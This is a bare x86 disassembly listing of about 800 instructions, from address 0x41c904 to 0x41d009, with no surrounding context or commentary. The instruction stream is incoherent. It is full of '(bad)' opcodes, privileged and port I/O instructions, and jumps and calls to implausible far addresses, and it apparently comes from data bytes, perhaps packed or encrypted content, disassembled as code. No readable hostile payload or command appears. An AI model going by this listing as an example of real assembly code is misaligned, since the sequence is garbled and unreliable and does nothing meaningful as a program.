  41c904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c905:	loopne 0x41c887
  41c907:	dec    esi
  41c908:	scas   al,BYTE PTR es:[edi]
  41c909:	cdq    
  41c90a:	rol    DWORD PTR [esi-0x64080f61],1
  41c910:	jecxz  0x41c937
  41c912:	push   esi
  41c913:	adc    ch,BYTE PTR [eax]
  41c915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c916:	pop    es
  41c917:	jb     0x41c8db
  41c919:	xor    DWORD PTR [ebx],ebx
  41c91b:	jne    0x41c904
  41c91d:	outs   dx,BYTE PTR ds:[esi]
  41c91e:	mov    bh,BYTE PTR [eax]
  41c920:	pop    eax
  41c921:	mov    ds:0xb04775,al
  41c926:	sbb    BYTE PTR [edx+0x24],cl
  41c929:	iret   
  41c92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c92b:	lahf   
  41c92c:	mov    eax,ds:0x2dea9700
  41c931:	xor    eax,0x6caf311c
  41c936:	scas   eax,DWORD PTR es:[edi]
  41c937:	in     eax,dx
  41c938:	ss xor al,0x3c
  41c93b:	pop    esi
  41c93c:	dec    ecx
  41c93d:	fnstenv [edx+0x3e5d76b8]
  41c943:	bound  ebp,QWORD PTR [esi-0xa]
  41c946:	mov    ch,0x6d
  41c948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c949:	mov    ds:0xae543c05,eax
  41c94e:	mov    ah,0x25
  41c950:	out    dx,eax
  41c951:	cli    
  41c952:	mov    edx,0xcdf43dc2
  41c957:	fcom   DWORD PTR [esi+0x7fb0845]
  41c95d:	xor    eax,0x3c645a44
  41c962:	push   cs
  41c963:	pop    edx
  41c964:	inc    edi
  41c965:	outs   dx,DWORD PTR ds:[esi]
  41c966:	jb     0x41c9de
  41c968:	jbe    0x41c9b1
  41c96a:	and    DWORD PTR [eax+eiz*2],edi
  41c96d:	icebp  
  41c96e:	out    0xb4,al
  41c970:	sbb    esi,0xffffffb3
  41c973:	jno    0x41c987
  41c975:	adc    ebp,DWORD PTR [ecx+0x45]
  41c978:	nop
  41c979:	sbb    ch,BYTE PTR [ecx-0xa38957c]
  41c97f:	jno    0x41c9a9
  41c981:	and    al,0x3c
  41c983:	xor    eax,DWORD PTR [eax+0x557f061]
  41c989:	cmc    
  41c98a:	xlat   BYTE PTR ds:[ebx]
  41c98b:	and    esp,ecx
  41c98d:	mov    dh,0xa0
  41c98f:	test   esi,ecx
  41c991:	add    BYTE PTR [edi],0x94
  41c994:	clc    
  41c995:	mov    DWORD PTR [ecx+0x5],ebp
  41c998:	into   
  41c999:	pushf  
  41c99a:	inc    edi
  41c99b:	js     0x41c9e1
  41c99d:	stos   BYTE PTR es:[edi],al
  41c99e:	adc    BYTE PTR [eax-0x48],0xdd
  41c9a2:	add    DWORD PTR [ecx+0x6c],esi
  41c9a5:	push   esp
  41c9a6:	jge    0x41c98c
  41c9a8:	fadd   st(3),st
  41c9aa:	mov    bh,0xc0
  41c9ac:	add    DWORD PTR [esi-0x1c],edx
  41c9af:	cwde   
  41c9b0:	xor    al,0x7e
  41c9b2:	mov    dh,0x33
  41c9b4:	pop    esp
  41c9b5:	mov    esi,0x10ea2637
  41c9ba:	dec    esp
  41c9bb:	call   0xe8973a83
  41c9c0:	push   edi
  41c9c1:	cmp    DWORD PTR [ebx+0x6e],esi
  41c9c4:	add    DWORD PTR [ebx+eax*2+0x41],ebp
  41c9c8:	sbb    DWORD PTR [edx+esi*8-0x5c],0xffffffc6
  41c9cd:	call   0x288:0xda555b8c
  41c9d4:	jo     0x41c9fd
  41c9d6:	mov    al,ds:0x9907e6b8
  41c9db:	inc    ecx
  41c9dc:	inc    edx
  41c9dd:	push   edx
  41c9de:	outs   dx,DWORD PTR ds:[esi]
  41c9df:	push   edi
  41c9e0:	out    dx,al
  41c9e1:	stos   DWORD PTR es:[edi],eax
  41c9e2:	fild   WORD PTR [esi]
  41c9e4:	and    cl,BYTE PTR [esi-0x2dc0a9c7]
  41c9ea:	fcom   DWORD PTR [ecx+0x51]
  41c9ed:	push   edx
  41c9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ef:	jecxz  0x41ca6b
  41c9f1:	das    
  41c9f2:	stos   BYTE PTR es:[edi],al
  41c9f3:	sbb    eax,0x40a71e6a
  41c9f8:	xor    edi,DWORD PTR [eax-0x27]
  41c9fb:	stos   DWORD PTR es:[edi],eax
  41c9fc:	jecxz  0x41ca74
  41c9fe:	scas   eax,DWORD PTR es:[edi]
  41c9ff:	ror    BYTE PTR [ebp+esi*8+0x70],0x0
  41ca04:	stc    
  41ca05:	cdq    
  41ca06:	and    DWORD PTR [edx-0xf],ebp
  41ca09:	out    dx,al
  41ca0a:	and    al,0x94
  41ca0c:	xchg   ebx,eax
  41ca0d:	(bad)  
  41ca0e:	ss inc edi
  41ca10:	loop   0x41c999
  41ca12:	mov    ds:0x392a6277,eax
  41ca17:	push   0xef532b56
  41ca1c:	pop    ss
  41ca1d:	outs   dx,BYTE PTR ds:[esi]
  41ca1e:	aaa    
  41ca1f:	fistp  QWORD PTR [ebx+0x3e6061cf]
  41ca25:	pop    es
  41ca26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca27:	adc    al,0x77
  41ca29:	ds ja  0x41ca54
  41ca2c:	pusha  
  41ca2d:	cmc    
  41ca2e:	mov    esp,0xf34c3e3a
  41ca33:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41ca35:	xor    BYTE PTR [ebx+edi*8+0x34566545],ah
  41ca3c:	adc    dh,BYTE PTR [edi]
  41ca3e:	call   0x88039c6
  41ca43:	dec    ebx
  41ca44:	jo     0x41ca5d
  41ca46:	xor    dh,BYTE PTR [ebx-0x734ca780]
  41ca4c:	sbb    esi,DWORD PTR [eax-0x43735f]
  41ca52:	pop    ecx
  41ca53:	out    0x93,al
  41ca55:	imul   eax,DWORD PTR [ebx-0x5a],0x6ca2fc11
  41ca5c:	and    eax,DWORD PTR [ebp-0x7f]
  41ca5f:	cs jo  0x41ca74
  41ca62:	and    al,BYTE PTR [esi]
  41ca64:	fadd   DWORD PTR [eax]
  41ca66:	ins    BYTE PTR es:[edi],dx
  41ca67:	enter  0x1592,0xae
  41ca6b:	jo     0x41c9f7
  41ca6d:	mov    cl,0x31
  41ca6f:	arpl   si,cx
  41ca71:	retf   0x3d7c
  41ca74:	retf   0xb3b7
  41ca77:	pop    esi
  41ca78:	cmp    DWORD PTR [ebx-0x33bb9b6b],ecx
  41ca7e:	cs or  al,0xd2
  41ca81:	push   ebx
  41ca82:	jbe    0x41cacd
  41ca84:	test   BYTE PTR [ebp+0x25],ch
  41ca87:	jg     0x41cab2
  41ca89:	popa   
  41ca8a:	jg     0x41cacb
  41ca8c:	loope  0x41caa4
  41ca8e:	jg     0x41ca3f
  41ca90:	lods   eax,DWORD PTR ds:[esi]
  41ca91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca92:	(bad)  [edi-0x7c]
  41ca95:	aam    0x7b
  41ca97:	mov    ah,0x82
  41ca99:	jns    0x41caec
  41ca9b:	push   ss
  41ca9c:	add    eax,0xc19ec2a1
  41caa1:	inc    cx
  41caa3:	xor    al,BYTE PTR [eax+0x42d1a98f]
  41caa9:	jnp    0x41ca97
  41caab:	xchg   ecx,eax
  41caac:	int3   
  41caad:	test   cl,bh
  41caaf:	sahf   
  41cab0:	in     al,dx
  41cab1:	test   DWORD PTR [esi+edx*1],ebx
  41cab4:	stc    
  41cab5:	push   edi
  41cab6:	inc    ebx
  41cab7:	scas   eax,DWORD PTR es:[edi]
  41cab8:	jg     0x41cac3
  41caba:	loope  0x41caf4
  41cabc:	test   DWORD PTR [eax+eiz*1+0x1dd2703e],0x622e8c3
  41cac7:	and    eax,0x9cd3ca3d
  41cacc:	das    
  41cacd:	(bad)  
  41cace:	adc    al,0x5c
  41cad0:	mov    eax,ds:0x5bda62c0
  41cad5:	popf   
  41cad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cad7:	clc    
  41cad8:	add    dl,BYTE PTR [esi+ebp*8]
  41cadb:	cli    
  41cadc:	inc    edi
  41cadd:	retf   0x39f4
  41cae0:	add    bl,cl
  41cae2:	repz rol eax,0x91
  41cae6:	int3   
  41cae7:	ss pop ebx
  41cae9:	cmp    bl,ah
  41caeb:	adc    esi,DWORD PTR [ecx]
  41caed:	xchg   edi,eax
  41caee:	in     al,0x2e
  41caf0:	daa    
  41caf1:	xchg   esp,eax
  41caf2:	fldenv [ecx]
  41caf4:	test   eax,0x8bcdadbc
  41caf9:	push   ebp
  41cafa:	push   ebp
  41cafb:	jne    0x41cad5
  41cafd:	pusha  
  41cafe:	mov    edi,0xa580365
  41cb03:	fistp  WORD PTR [ebp*4+0x7f1260b5]
  41cb0a:	(bad)  
  41cb0b:	mov    ah,0xd4
  41cb0d:	dec    eax
  41cb0e:	cmp    eax,0x2230f6fc
  41cb13:	imul   ebp,ecx,0xffffffad
  41cb16:	pop    ss
  41cb17:	xor    DWORD PTR [ecx-0x15a839c2],esi
  41cb1d:	jae    0x41cac7
  41cb1f:	out    0x86,al
  41cb21:	clc    
  41cb22:	sar    DWORD PTR [esi],1
  41cb24:	push   ss
  41cb25:	xlat   BYTE PTR ds:[ebx]
  41cb26:	pop    es
  41cb27:	cmp    ebp,DWORD PTR [edx-0x66]
  41cb2a:	jmp    0x70e8:0x6698f4ad
  41cb31:	pop    ebx
  41cb32:	out    dx,al
  41cb33:	aas    
  41cb34:	pop    edi
  41cb35:	jo     0x41cb4b
  41cb37:	test   WORD PTR ds:0x326a6825,di
  41cb3e:	sbb    edi,DWORD PTR [ebp+0x60706fb7]
  41cb44:	or     al,0x87
  41cb46:	pop    ebx
  41cb47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb48:	mov    ebp,0x3fb74893
  41cb4d:	cli    
  41cb4e:	dec    ebx
  41cb4f:	sbb    ebp,DWORD PTR [ecx+ebp*2]
  41cb52:	xor    dh,BYTE PTR ss:[edi-0x24f63430]
  41cb59:	dec    esp
  41cb5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb5b:	sbb    al,0x33
  41cb5d:	test   eax,0x40e55e96
  41cb62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb63:	pop    ebp
  41cb64:	lock jp 0x41cbb4
  41cb67:	pop    ecx
  41cb68:	in     al,dx
  41cb69:	sub    BYTE PTR [ebp-0x41dd83f6],bl
  41cb6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb70:	loop   0x41cb35
  41cb72:	dec    esp
  41cb73:	loope  0x41cba7
  41cb75:	ret    
  41cb76:	or     DWORD PTR [edx-0x54],ebx
  41cb79:	fcom   DWORD PTR [edx]
  41cb7b:	or     DWORD PTR [bp+si],esp
  41cb7e:	inc    edi
  41cb7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb80:	pop    ss
  41cb81:	loopne 0x41cbe2
  41cb83:	xor    DWORD PTR [ebp-0x7032e9f3],edx
  41cb89:	daa    
  41cb8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb8b:	add    cl,BYTE PTR [edi+0x5f8be9f7]
  41cb91:	push   edx
  41cb92:	mov    ch,0xbf
  41cb94:	lods   al,BYTE PTR ds:[esi]
  41cb95:	retf   0x20fb
  41cb98:	popf   
  41cb99:	mul    al
  41cb9b:	jb     0x41cb21
  41cb9d:	std    
  41cb9e:	popa   
  41cb9f:	fidiv  WORD PTR [eax]
  41cba1:	inc    esp
  41cba2:	inc    edx
  41cba3:	sub    BYTE PTR [ecx],ch
  41cba5:	rdmsr  
  41cba7:	das    
  41cba8:	ins    DWORD PTR es:[edi],dx
  41cba9:	pop    ebx
  41cbaa:	xor    eax,0x160ba8af
  41cbaf:	add    BYTE PTR [ebx],bl
  41cbb1:	hlt    
  41cbb2:	lods   al,BYTE PTR ds:[esi]
  41cbb3:	push   ecx
  41cbb4:	push   0xf371393f
  41cbb9:	lock pop ecx
  41cbbb:	mov    cl,0x3e
  41cbbd:	jle    0x41cc32
  41cbbf:	lock fwait
  41cbc1:	stc    
  41cbc2:	js     0x41cb56
  41cbc4:	rcr    BYTE PTR [esi-0x192d26ae],0xe7
  41cbcb:	(bad)
  41cbce:	dec    eax
  41cbcf:	add    eax,0xf1ea478d
  41cbd4:	and    cl,bh
  41cbd6:	(bad)  
  41cbd7:	ficom  DWORD PTR fs:[edx-0x79]
  41cbdb:	lock scas eax,DWORD PTR es:[edi]
  41cbdd:	mov    DWORD PTR [ebx-0x7d],ebp
  41cbe0:	dec    eax
  41cbe1:	fmul   QWORD PTR [ebp-0x774174fc]
  41cbe7:	inc    edi
  41cbe8:	push   ss
  41cbe9:	ret    
  41cbea:	or     esp,DWORD PTR [eax+0x6c]
  41cbed:	push   0xffffffd9
  41cbef:	stos   BYTE PTR es:[edi],al
  41cbf0:	dec    ebp
  41cbf1:	out    dx,eax
  41cbf2:	add    BYTE PTR [ecx-0x19c5e342],al
  41cbf8:	mov    al,BYTE PTR [esi+0x45]
  41cbfb:	gs and al,0x56
  41cbfe:	imul   edx,DWORD PTR [ecx],0xffffff81
  41cc01:	xchg   edi,eax
  41cc02:	mov    esp,0xab4f1767
  41cc07:	sbb    al,0x56
  41cc09:	sub    BYTE PTR [ebx-0x56ec55d],dl
  41cc0f:	cdq    
  41cc10:	xchg   ecx,eax
  41cc11:	dec    edx
  41cc12:	or     al,0x2a
  41cc14:	imul   ebp,DWORD PTR [esi+0x78646e53],0x230bb749
  41cc1e:	mov    ecx,0x7169566d
  41cc23:	jae    0x41cbd2
  41cc25:	loopne 0x41cc3f
  41cc27:	(bad)  
  41cc28:	ja     0x41cca4
  41cc2a:	inc    esi
  41cc2b:	ror    BYTE PTR [ebx-0x5b1e0d67],1
  41cc31:	push   cs
  41cc32:	test   BYTE PTR fs:[edx],dh
  41cc35:	mov    ds:0x2e1f881b,al
  41cc3a:	sti    
  41cc3b:	hlt    
  41cc3c:	fcmovu st,st(4)
  41cc3e:	sbb    BYTE PTR [ebp-0x53bf32ea],al
  41cc44:	xchg   edi,eax
  41cc45:	xor    ebp,ebx
  41cc47:	and    BYTE PTR [ebx+esi*2],dl
  41cc4a:	jae    0x41cbe4
  41cc4c:	(bad)  
  41cc4d:	jp     0x41cc27
  41cc4f:	clc    
  41cc50:	mov    al,0xb3
  41cc52:	jo     0x41cc18
  41cc54:	scas   eax,DWORD PTR es:[edi]
  41cc55:	inc    ebp
  41cc56:	xchg   DWORD PTR [edi+0x33],edx
  41cc59:	inc    esp
  41cc5a:	lods   eax,DWORD PTR ds:[esi]
  41cc5b:	cld    
  41cc5c:	xor    eax,0x8f1fa4cf
  41cc61:	pop    ss
  41cc62:	int3   
  41cc63:	push   ecx
  41cc64:	in     al,dx
  41cc65:	sub    ebx,ecx
  41cc67:	fs jns 0x41cbf7
  41cc6a:	fld    DWORD PTR [eax-0x20]
  41cc6d:	lock repnz imul edx,DWORD PTR [edi+0x33],0x42
  41cc73:	arpl   WORD PTR cs:[edi],bx
  41cc76:	lods   eax,DWORD PTR ds:[esi]
  41cc77:	cmp    ecx,DWORD PTR [ebx-0x12]
  41cc7a:	add    al,0x53
  41cc7c:	outs   dx,DWORD PTR ds:[esi]
  41cc7d:	cmc    
  41cc7e:	jae    0x41cc4f
  41cc80:	pusha  
  41cc81:	xchg   edx,eax
  41cc82:	sbb    eax,0xbb9a9d44
  41cc87:	dec    eax
  41cc88:	rcr    eax,0xe
  41cc8b:	sub    DWORD PTR [esi],ebx
  41cc8d:	adc    ebp,DWORD PTR [edi+0x29bce94e]
  41cc93:	rcr    DWORD PTR [ecx+0xe],1
  41cc96:	pop    ecx
  41cc97:	and    eax,0x7dcb205f
  41cc9c:	rcr    BYTE PTR [esp+ebx*8-0x6db18fda],cl
  41cca3:	mov    al,0x11
  41cca5:	jb     0x41cc2a
  41cca7:	push   ebp
  41cca8:	popf   
  41cca9:	lahf   
  41ccaa:	fs dec edi
  41ccac:	(bad)  
  41ccae:	sbb    eax,DWORD PTR [ecx+eax*4]
  41ccb1:	shl    BYTE PTR [esi-0x2e],0x34
  41ccb5:	(bad)  
  41ccb6:	std    
  41ccb7:	push   esp
  41ccb8:	sbb    eax,0x95fd6b9
  41ccbd:	cdq    
  41ccbe:	xchg   ebx,eax
  41ccbf:	aaa    
  41ccc0:	shr    DWORD PTR [ebp+edx*8-0x7b],1
  41ccc4:	cld    
  41ccc5:	jnp    0x41cca0
  41ccc7:	xchg   ebp,eax
  41ccc8:	and    al,0x69
  41ccca:	stc    
  41cccb:	sbb    BYTE PTR [esi+0x7aa975fd],bh
  41ccd1:	int3   
  41ccd2:	adc    dh,ah
  41ccd4:	leave  
  41ccd5:	mov    cl,0xf3
  41ccd7:	pop    es
  41ccd8:	pushf  
  41ccd9:	loope  0x41cc64
  41ccdb:	fsubr  DWORD PTR [eax-0x246ba5a]
  41cce1:	sti    
  41cce2:	pop    ebx
  41cce3:	jb     0x41ccb6
  41cce5:	dec    ebp
  41cce6:	mov    eax,ds:0x7dda0
  41cceb:	lahf   
  41ccec:	fidivr WORD PTR [eax+0x6a]
  41ccef:	or     BYTE PTR [edx-0xa306d5],cl
  41ccf5:	test   DWORD PTR [edx+0x5b],ecx
  41ccf8:	push   ebp
  41ccf9:	stc    
  41ccfa:	push   cs
  41ccfb:	test   al,0xb7
  41ccfd:	jae    0x41cd27
  41ccff:	xchg   esi,eax
  41cd00:	bnd jmp 0x15119f9f
  41cd06:	add    eax,0x60aa36f1
  41cd0b:	call   0xa0fece50
  41cd10:	imul   eax,DWORD PTR [eax-0x19],0xede3146f
  41cd17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd18:	pop    eax
  41cd19:	fcomp  DWORD PTR [edi-0x21]
  41cd1c:	sbb    al,0x71
  41cd1e:	icebp  
  41cd1f:	push   eax
  41cd20:	sub    al,0x97
  41cd22:	push   0x7
  41cd24:	shl    DWORD PTR [edi],0x98
  41cd27:	rol    BYTE PTR [eax],1
  41cd29:	adc    BYTE PTR [ecx+0x4f4de089],ch
  41cd2f:	fwait
  41cd30:	es dec eax
  41cd32:	sub    DWORD PTR [eax],esi
  41cd34:	sbb    DWORD PTR [ecx],0x4e4be2ef
  41cd3a:	das    
  41cd3b:	cmp    al,ch
  41cd3d:	dec    ebp
  41cd3e:	jbe    0x41cd64
  41cd40:	nop    esi
  41cd43:	or     eax,0xe83a12f7
  41cd48:	ja     0x41cd79
  41cd4a:	in     eax,0xc6
  41cd4c:	xchg   esp,eax
  41cd4d:	iret   
  41cd4e:	jmp    0xc4cc598c
  41cd53:	in     al,dx
  41cd54:	(bad)  
  41cd55:	sub    al,0xd8
  41cd57:	mov    eax,0xbc748b67
  41cd5c:	les    edi,FWORD PTR [ebx-0x14]
  41cd5f:	mov    esp,0x240cdef1
  41cd64:	jge    0x41cd1f
  41cd66:	mov    esi,0x6d37a888
  41cd6b:	mov    BYTE PTR [ecx+0x8d658c2],bh
  41cd71:	push   esi
  41cd72:	scas   eax,DWORD PTR es:[edi]
  41cd73:	bound  esi,QWORD PTR [ecx+0x6]
  41cd76:	dec    DWORD PTR [edi]
  41cd78:	cmp    bl,cl
  41cd7a:	jb     0x41cd53
  41cd7c:	and    eax,0xffffffa9
  41cd7f:	jnp    0x41cd9f
  41cd81:	js     0x41cdd2
  41cd83:	jb     0x41cd3e
  41cd85:	cs loope 0x41ce00
  41cd88:	in     eax,0x9
  41cd8a:	shl    DWORD PTR [ebp+eiz*4-0x5aa0045f],cl
  41cd91:	cwde   
  41cd92:	test   eax,0x7cf0d55b
  41cd97:	xlat   BYTE PTR ds:[ebx]
  41cd98:	pop    edx
  41cd99:	int    0x7f
  41cd9b:	in     al,dx
  41cd9c:	lahf   
  41cd9d:	mov    ebp,0xa1d360e6
  41cda2:	dec    eax
  41cda3:	(bad)  
  41cda4:	and    BYTE PTR [edx],al
  41cda6:	mov    ebx,0x40607ea0
  41cdab:	jmp    0x41cd6c
  41cdad:	in     al,dx
  41cdae:	or     BYTE PTR [esi+0x43],dl
  41cdb1:	xor    al,0xb0
  41cdb3:	and    ebx,DWORD PTR ds:0xa1344f27
  41cdb9:	sar    BYTE PTR [ebp-0x42],0xc9
  41cdbd:	scas   eax,DWORD PTR es:[edi]
  41cdbe:	jns    0x41ce0f
  41cdc0:	repnz lock xchg ebp,eax
  41cdc3:	pushf  
  41cdc4:	mov    bh,0x8
  41cdc6:	mov    fs,WORD PTR [esi]
  41cdc8:	hlt    
  41cdc9:	mov    edx,0x20c33379
  41cdce:	shl    BYTE PTR [ecx+0x57922d06],0xcf
  41cdd5:	jnp    0x41ce19
  41cdd7:	adc    al,0x9d
  41cdd9:	jo     0x41cdce
  41cddb:	inc    edx
  41cddc:	xchg   BYTE PTR gs:[ebp-0x5b],dl
  41cde0:	ss inc ebp
  41cde2:	cmp    al,0x19
  41cde4:	arpl   WORD PTR [esi],sp
  41cde6:	jae    0x41cde2
  41cde8:	sub    al,0xc1
  41cdea:	mov    edx,0x45bbd442
  41cdef:	jle    0x41ce70
  41cdf1:	aas    
  41cdf2:	cwde   
  41cdf3:	(bad)  
  41cdf4:	aad    0x69
  41cdf6:	outs   dx,BYTE PTR ds:[esi]
  41cdf7:	sbb    al,0x9e
  41cdf9:	jecxz  0x41ce00
  41cdfb:	adc    esi,DWORD PTR [ecx-0x73]
  41cdfe:	stos   DWORD PTR es:[edi],eax
  41cdff:	cdq    
  41ce00:	inc    esi
  41ce01:	clc    
  41ce02:	leave  
  41ce03:	xchg   ebx,eax
  41ce04:	mov    eax,ds:0x26ed0105
  41ce09:	mov    ds:0xab260fa9,eax
  41ce0e:	pop    ebx
  41ce0f:	aad    0xa7
  41ce11:	mov    al,0x5
  41ce13:	dec    edx
  41ce14:	dec    ebp
  41ce15:	xchg   ebx,eax
  41ce16:	add    BYTE PTR [ecx-0x19],cl
  41ce19:	(bad)  
  41ce1a:	(bad)  
  41ce1b:	repz jecxz 0x41ce7a
  41ce1e:	mov    ah,0x68
  41ce20:	lahf   
  41ce21:	sbb    dh,ah
  41ce23:	fisttp DWORD PTR [esi+0x48]
  41ce26:	jge    0x41ce25
  41ce28:	lahf   
  41ce29:	xchg   edx,eax
  41ce2a:	fsubp  st(0),st
  41ce2c:	les    esp,FWORD PTR [edx+eax*8]
  41ce2f:	mov    eax,ds:0xe2f9d9d3
  41ce34:	add    BYTE PTR [ecx+0x222c0e93],0xf3
  41ce3b:	pop    esi
  41ce3c:	fidivr WORD PTR [ebx]
  41ce3e:	lds    edx,FWORD PTR [eax+0x5f]
  41ce41:	mov    bh,0xda
  41ce43:	fwait
  41ce44:	inc    ebp
  41ce45:	test   DWORD PTR [esi-0x137a4d21],ecx
  41ce4b:	xchg   DWORD PTR [ebp-0x19c89d02],edx
  41ce51:	imul   ecx,DWORD PTR [edx],0x42c233fa
  41ce57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce58:	add    DWORD PTR ds:0xb0f5eb67,0xffffff8f
  41ce5f:	xlat   BYTE PTR ds:[ebx]
  41ce61:	enter  0xcca3,0x40
  41ce65:	dec    ecx
  41ce66:	(bad)  
  41ce67:	jg     0x41ce37
  41ce69:	pop    ebx
  41ce6a:	mov    edi,DWORD PTR [ebp-0x6084e5a8]
  41ce70:	es pop eax
  41ce72:	dec    esi
  41ce73:	std    
  41ce74:	jl     0x41cec9
  41ce76:	pop    es
  41ce77:	mov    WORD PTR [eax+esi*2+0x49002f59],cs
  41ce7e:	jo     0x41ceca
  41ce80:	jb     0x41ce5a
  41ce82:	sub    eax,0xa44c4061
  41ce87:	dec    esi
  41ce88:	inc    edx
  41ce89:	cmp    ebp,DWORD PTR ds:0x1b178208
  41ce8f:	ins    BYTE PTR es:[edi],dx
  41ce90:	mov    ecx,0xa3c20ead
  41ce95:	jle    0x41ce65
  41ce97:	lods   al,BYTE PTR ds:[esi]
  41ce98:	mov    edx,0x9ae7e5b7
  41ce9d:	xchg   ebx,eax
  41ce9e:	pop    ebp
  41ce9f:	or     al,0x8
  41cea1:	ja     0x41ce7e
  41cea3:	push   ebx
  41cea4:	das    
  41cea5:	xchg   ebp,eax
  41cea6:	pop    edi
  41cea7:	jmp    0xdd40:0x9b06
  41cead:	aam    0xc0
  41ceaf:	sbb    DWORD PTR [esi+0x5af4d5ba],esp
  41ceb5:	push   esi
  41ceb6:	test   DWORD PTR [edx],esi
  41ceb8:	jb     0x41cee6
  41ceba:	into   
  41cebb:	pop    ecx
  41cebc:	call   0x482f:0x9fb9e3e0
  41cec3:	push   eax
  41cec4:	or     BYTE PTR [esi-0x1a],ch
  41cec7:	mov    ecx,0x47c51cef
  41cecc:	inc    ecx
  41cecd:	fs sti 
  41cecf:	ins    DWORD PTR es:[edi],dx
  41ced0:	push   ebx
  41ced1:	or     DWORD PTR [ebp-0x472f43bc],ecx
  41ced7:	and    BYTE PTR [esi-0x271663ae],bh
  41cedd:	or     edi,DWORD PTR [edx]
  41cedf:	push   ebx
  41cee0:	xchg   edi,eax
  41cee1:	mov    bh,0xc1
  41cee3:	lds    eax,FWORD PTR ds:0xe51f24a1
  41cee9:	dec    eax
  41ceea:	stos   DWORD PTR es:[edi],eax
  41ceeb:	xor    bh,BYTE PTR [eax-0x40a247d6]
  41cef1:	push   ss
  41cef2:	xor    edi,DWORD PTR [esi+0x7ec9602b]
  41cef8:	xchg   ecx,eax
  41cef9:	rcl    DWORD PTR [ecx-0x51af0c5],0x9c
  41cf00:	mov    eax,0x823f3743
  41cf05:	ss jmp 0x41cf44
  41cf08:	das    
  41cf09:	ja     0x41cf59
  41cf0b:	ja     0x41cebe
  41cf0d:	ret    
  41cf0e:	pop    eax
  41cf0f:	cmp    al,0x33
  41cf11:	xor    DWORD PTR [ecx],ebp
  41cf13:	xor    al,0xc7
  41cf15:	pop    esi
  41cf16:	push   ds
  41cf17:	not    BYTE PTR [ebx]
  41cf19:	adc    BYTE PTR gs:[eax+0x66],dl
  41cf1d:	clc    
  41cf1e:	(bad)  
  41cf20:	sbb    eax,0x125089c1
  41cf25:	imul   esi,ecx,0xfffffff8
  41cf28:	cmp    eax,0x413cbd8c
  41cf2d:	ins    BYTE PTR es:[edi],dx
  41cf2e:	ret    
  41cf2f:	out    0xcb,eax
  41cf31:	inc    esi
  41cf32:	xchg   BYTE PTR [edi-0x436217e9],bl
  41cf38:	retf   
  41cf39:	push   esi
  41cf3a:	jns    0x41cec3
  41cf3c:	xchg   esi,eax
  41cf3d:	jmp    0x1c337050
  41cf42:	nop
  41cf43:	pop    edx
  41cf44:	out    dx,eax
  41cf45:	std    
  41cf46:	rcr    DWORD PTR [esi-0x79497c65],1
  41cf4c:	out    0x50,eax
  41cf4e:	xor    eax,0x5e08aad8
  41cf53:	xor    al,0xf6
  41cf55:	or     BYTE PTR [ebx],0x47
  41cf58:	ds dec esi
  41cf5a:	cld    
  41cf5b:	or     al,BYTE PTR [edi+0x5f7179c]
  41cf61:	fs adc al,0xe2
  41cf64:	test   eax,0x5a0b52af
  41cf6a:	cs out dx,eax
  41cf6c:	mov    bh,0x40
  41cf6e:	add    BYTE PTR [edi-0x70c8c8f2],ah
  41cf74:	xchg   BYTE PTR [ebx],cl
  41cf76:	ins    BYTE PTR es:[edi],dx
  41cf77:	mul    BYTE PTR [esi+0x1d800349]
  41cf7d:	sbb    al,0x70
  41cf7f:	rcr    BYTE PTR ds:[esi+0x51acc5be],1
  41cf86:	sub    eax,0xad2a9b00
  41cf8b:	imul   esi,ebx,0x55
  41cf8e:	test   BYTE PTR [ebx-0x2a03589],0x4f
  41cf95:	(bad)  
  41cf96:	ds or  edi,ebp
  41cf99:	mov    esi,0xd872fc1f
  41cf9e:	dec    BYTE PTR [ecx-0x22]
  41cfa1:	rcl    BYTE PTR [edx],0xf5
  41cfa4:	test   al,0x9f
  41cfa6:	jnp    0x41cf43
  41cfa8:	adc    BYTE PTR [edx],cl
  41cfaa:	sbb    BYTE PTR [eax+eax*2-0x44aee164],ch
  41cfb1:	xchg   ebx,eax
  41cfb2:	inc    ebx
  41cfb3:	xchg   edx,eax
  41cfb4:	inc    esi
  41cfb5:	(bad)  
  41cfb6:	in     eax,0xbe
  41cfb8:	stos   BYTE PTR es:[edi],al
  41cfb9:	inc    edi
  41cfba:	pushf  
  41cfbb:	ins    DWORD PTR es:[edi],dx
  41cfbc:	mov    ebp,0x50e05bb2
  41cfc1:	mov    ebx,0x79f2dcfa
  41cfc6:	inc    ecx
  41cfc7:	lock adc dl,dh
  41cfca:	lea    ebp,[ebx+eiz*8+0x32bcae70]
  41cfd1:	xchg   edx,eax
  41cfd2:	je     0x41cf82
  41cfd4:	sub    al,0x97
  41cfd6:	push   es
  41cfd7:	es jmp 0x547456a9
  41cfdd:	int3   
  41cfde:	dec    edx
  41cfdf:	or     bl,ah
  41cfe1:	sub    BYTE PTR [ebx-0x72],bl
  41cfe4:	aaa    
  41cfe5:	xor    al,0x48
  41cfe7:	sub    eax,0xda1ec758
  41cfec:	lods   al,BYTE PTR ds:[esi]
  41cfed:	add    al,0x17
  41cfef:	jl     0x41d02e
  41cff1:	and    edx,edx
  41cff3:	hlt    
  41cff4:	push   ss
  41cff5:	push   eax
  41cff6:	add    eax,0x4e509fc8
  41cffb:	cmp    ecx,DWORD PTR [eax-0x29b22f71]
  41d001:	xor    bl,ah
  41d003:	add    bh,ch
  41d005:	aaa    
  41d006:	das    
  41d007:	stos   BYTE PTR es:[edi],al
  41d008:	xlat   BYTE PTR ds:[ebx]
  41d009:	mov    BYTE PTR [edx],ah
